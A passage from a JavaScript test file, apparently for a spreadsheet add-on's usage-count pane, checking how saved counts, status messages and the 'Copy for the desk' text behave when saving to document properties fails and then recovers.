  await pane.saving();
  assert.deepEqual(JSON.parse(kept).days["2026-10-23"], [["completion", "vocabulary", "customers", 3, 48]], "the first of the two was saved");
  assert.equal(pane.ui.usageNote.textContent, "The latest counts could not be kept (Limit exceeded: Properties read/write); they stay for this session, and the next use tries again.");
  assert.equal(pane.ui.usageTotals.textContent, "Today: 4 uses, 64 keystrokes saved. Last 7 days: 4 uses, 64 keystrokes saved.", "the use the failed save did not keep is still shown");
  // Copy saves first; while that fails, it gives no text.
  pane.ui.usageText.value = "an older text";
  await pane.copyUsage();
  assert.equal(pane.ui.usageText.value, "");
  assert.equal(pane.ui.usageStatus.textContent, "Nothing copied: the counts could not be saved first, and a text copied before they are saved could count uses twice on the desk. Try Copy for the desk again later.");
  failFrom = Infinity;
  await pane.copyUsage();
  assert.deepEqual(sheets.usage.parseUsage(pane.ui.usageText.value).usage.days["2026-10-23"], [["completion", "vocabulary", "customers", 4, 64]]);
  assert.equal(kept, pane.ui.usageText.value, "the text is what was saved");
  assert.match(pane.ui.usageStatus.textContent, /^The text is selected in the box/);
});
